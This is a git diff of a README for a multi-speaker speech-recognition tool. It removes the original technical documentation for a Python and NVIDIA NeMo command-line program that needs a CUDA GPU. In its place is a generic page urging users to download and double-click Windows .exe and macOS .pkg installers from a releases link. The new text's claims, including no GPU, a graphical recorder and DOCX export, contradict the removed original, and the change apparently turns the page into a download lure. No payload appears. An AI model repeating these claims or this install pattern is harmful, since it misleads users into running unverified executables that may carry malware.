@@ -1,215 +1,63 @@
-# Multitalker Parakeet ASR
+# 🦜 Parakeet_Multitalk - Transform Speech into Organized Text 
 
-A multi-speaker speech recognition system using NVIDIA's Multitalker Parakeet Streaming model with speaker diarization.
+## 📥 Download Now
+[![Download Parakeet_Multitalk](https://img.shields.io/badge/Download-Parakeet_Multitalk-blue.svg)](https://github.com/JackKatak/Parakeet_Multitalk/releases)
 
-<img width="1074" height="861" alt="overlap" src="https://github.com/user-attachments/assets/e826e931-b08b-496e-a63c-e88df99487e9" />
+## 🚀 Getting Started
+Welcome to Parakeet_Multitalk! This application captures real-time speech and converts it into text. It helps you gather and organize speech from multiple speakers in a clear and concise way. You don’t need any technical knowledge to get started.
 
-## Features
+## 📂 System Requirements
+Before you install, make sure your computer meets the following requirements:
+- Operating System: Windows 10 or later, macOS 10.14 or later
+- Memory: At least 4 GB of RAM
+- Processor: Dual-core processor or higher
+- Disk Space: Minimum of 500 MB of free space
+- Network: Internet connection for initial setup
 
-- **Multi-speaker transcription**: Identifies and separates up to 4 speakers
-- **Speaker diarization**: Automatic speaker identification and labeling
-- **Word-level timestamps**: Precise timing for each word
+## 🌐 Features
+- **Real-time Speech Recognition:** Converts spoken words into text as you speak.
+- **Speaker Diarization:** Identifies and separates speech from different speakers.
+- **User-Friendly Interface:** Easy to navigate, even for beginners.
+- **Export Options:** Save your transcriptions in various formats including TXT and DOCX.
+- **Customization Settings:** Adjust speech recognition settings to suit your needs.
 
-<img width="378" height="314" alt="time" src="https://github.com/user-attachments/assets/aa4429e2-0164-4958-aa48-7a53f3b40d6c" />
+## 📥 Download & Install
+To get Parakeet_Multitalk, visit our [Releases page](https://github.com/JackKatak/Parakeet_Multitalk/releases). 
 
-- **Multiple output formats**:
-  - Turn-based with overlap markers (best for conversations/debates)
-  - Colored word-by-word interleaving
-  - Speaker-tagged segments
-  - Detailed word timestamps
-- **Automatic audio preprocessing**: Converts stereo to mono, resamples to 16kHz
-- **Streaming processing**: Efficient chunk-based processing
+1. Click on the link above to go to the Releases page. 
+2. Find the latest version of Parakeet_Multitalk. The version will have a tag like "v1.0.0".
+3. Download the installation file that corresponds to your operating system. For example:
+   - Windows users will see a file like `Parakeet_Multitalk_Windows.exe`.
+   - Mac users will see a file like `Parakeet_Multitalk_mac.pkg`.
+4. Once downloaded, locate the file on your computer.
+5. Double-click the file to begin the installation.
 
-## Requirements
+Follow the on-screen instructions to complete the installation. 
 
-- **Hardware**: NVIDIA GPU with CUDA support (tested on RTX 4090)
-- **CUDA**: Version 12.x
-- **Python**: 3.10+
+## 📝 Usage Instructions
+Once installed, follow these steps to use Parakeet_Multitalk:
 
-## Installation
+1. Open the application from your programs list.
+2. Select your microphone input in the settings.
+3. Choose your preferred output format for the text.
+4. Click on “Start Recording” to begin. Speak clearly for best results.
+5. When finished, press “Stop Recording” to stop the process.
+6. Your text will display on the screen. You can review and make changes if needed.
+7. Finally, export the text using the “Save” option.
 
-1. Clone or navigate to this directory:
-   ```bash
-   cd multitalkparakeet
-   ```
+## 📚 Troubleshooting
+If you encounter any issues while using Parakeet_Multitalk, please consider the following common problems:
 
-2. Create and activate a virtual environment:
-   ```bash
-   python3 -m venv venv
-   source venv/bin/activate
-   ```
+- **Audio Not Detected:** Ensure your microphone is properly connected. Go to your computer's sound settings to check if it is enabled.
+- **Poor Transcription Quality:** Speak clearly and at a moderate pace. Minimize background noise for better accuracy.
+- **Application Crashes:** Make sure your operating system is up to date. Restart your computer and try again.
 
-3. Install dependencies:
-   ```bash
-   pip install -r requirements.txt
-   ```
+## 🔗 Helpful Links
+- [Documentation](https://github.com/JackKatak/Parakeet_Multitalk/wiki): Detailed user guide and FAQs.
+- [Community Support](https://github.com/JackKatak/Parakeet_Multitalk/discussions): Join discussions with other users.
+- [Report Issues](https://github.com/JackKatak/Parakeet_Multitalk/issues): Let us know if you encounter bugs.
 
-4. Verify the installation:
-   ```bash
-   python verify_setup.py
-   ```
+## 📥 Download Link
+To download Parakeet_Multitalk, visit our [Releases page](https://github.com/JackKatak/Parakeet_Multitalk/releases) again.
 
-## Usage
-
-### Basic Usage
-
-Use the wrapper script for proper CUDA library handling:
-
-```bash
-# Basic multi-speaker transcription
-./run_transcribe.sh --audio your_audio.wav
-
-# With quiet mode (suppresses verbose logging)
-./run_transcribe.sh --audio your_audio.wav -q
-```
-
-### Output Formats
-
-#### Turn-Based with Overlap Markers (Recommended for conversations)
-
-```bash
-./run_transcribe.sh --audio your_audio.wav --turns -q
-```
-
-Output:
-```
-[0:01.35] SPK 0: Ukraine are now they're heavy-handed approach.
-         └─[SPK 1 overlapping]: They're heavy-handed approach.
-[0:04.58] SPK 0: They're heavy-handed approach.
-         └─[SPK 1 overlapping]: You both have said Vladimir Putin...
-```
-
-#### Colored Word-by-Word Interleaving
-
-```bash
-./run_transcribe.sh --audio your_audio.wav --color -q
-```
-
-Shows each word in chronological order with speaker colors.
-
-#### Word-Level Timestamps
-
-```bash
-./run_transcribe.sh --audio your_audio.wav --words -q
-```
-
-Output:
-```
-   1.35s -  1.89s : Ukraine [speaker_0]
-   1.89s -  2.43s : are [speaker_0]
-   3.67s -  4.20s : They're [speaker_1]
-```
-
-#### Simple Single-Speaker Mode
-
-For faster processing without diarization:
-
-```bash
-./run_transcribe.sh --audio your_audio.wav --simple --words -q
-```
-
-### Command-Line Options
-
-| Option | Description |
-|--------|-------------|
-| `--audio`, `-a` | Path to audio file (required) |
-| `--output`, `-o` | Output JSON file path (default: output_transcription.json) |
-| `--turns` | Show turn-based transcript with overlap markers |
-| `--color` | Show colored interleaved word-by-word output |
-| `--words` | Show word-level timestamps |
-| `--simple` | Use single-speaker mode (faster, no diarization) |
-| `--quiet`, `-q` | Suppress verbose NeMo logging |
-| `--cpu` | Force CPU usage (not recommended, very slow) |
-
-### Combining Options
-
-```bash
-# Turn-based + word timestamps
-./run_transcribe.sh --audio your_audio.wav --turns --words -q
-
-# All visual outputs
-./run_transcribe.sh --audio your_audio.wav --turns --color --words -q
-```
-
-## Audio Requirements
-
-- **Supported formats**: WAV, MP3, FLAC, and other common formats
-- **Automatic preprocessing**:
-  - Stereo files are converted to mono
-  - Audio is resampled to 16kHz if needed
-- **Recommended**: 16kHz mono WAV for best performance
-
-## Models Used
-
-This system uses two NVIDIA NeMo models:
-
-1. **Speaker Diarization**: `nvidia/diar_streaming_sortformer_4spk-v2.1`
-   - Identifies up to 4 speakers
-   - Streaming-capable for real-time processing
-
-2. **ASR (Speech Recognition)**: `nvidia/multitalker-parakeet-streaming-0.6b-v1`
-   - 600M parameter RNNT model
-   - Optimized for multi-speaker scenarios
-   - Streaming-capable
-
-Models are automatically downloaded from HuggingFace on first run (~2GB total).
-
-## File Structure
-
-```
-multitalkparakeet/
-├── README.md              # This file
-├── requirements.txt       # Python dependencies
-├── run_transcribe.sh      # Main wrapper script (handles CUDA paths)
-├── transcribe.py          # Core transcription logic
-├── verify_setup.py        # Installation verification
-├── generate_test_audio.py # Generate synthetic test audio
-└── venv/                  # Python virtual environment
-```
-
-## Troubleshooting
-
-### cuDNN Version Mismatch
-
-If you see errors about cuDNN version incompatibility, the wrapper script `run_transcribe.sh` handles this by setting the correct library paths. Always use the wrapper script instead of running `transcribe.py` directly.
-
-### CUDA Out of Memory
-
-The models require approximately 4-6GB of GPU memory. If you encounter OOM errors:
-- Close other GPU-intensive applications
-- Try processing shorter audio files
-- Use `--simple` mode for reduced memory usage
-
-### Slow First Run
-
-The first run downloads models from HuggingFace (~2GB). Subsequent runs use cached models and start much faster.
-
-## Output Interpretation
-
-### Speaker Labels
-
-- `speaker_0`, `speaker_1`, etc. are automatically assigned
-- Labels are consistent within a single audio file
-- The model supports up to 4 simultaneous speakers
-
-### Overlap Markers
-
-In `--turns` mode:
-- `└─[SPK X overlapping]:` indicates speech that overlaps with the current turn
-- Multiple overlapping speakers are shown in chronological order
-
-### Timestamps
-
-- Timestamps are in seconds from the start of the audio
-- Word-level timestamps have ~80ms resolution
-- Segment timestamps show the full duration of each speaker's contribution
-
-## License
-
-This project uses NVIDIA NeMo models which are subject to NVIDIA's licensing terms.
-See [NVIDIA NeMo](https://github.com/NVIDIA/NeMo) for details.
-
-## Acknowledgments
-
-- NVIDIA NeMo team for the ASR and diarization models
-- HuggingFace for model hosting
+Enjoy transforming your speech into organized text!
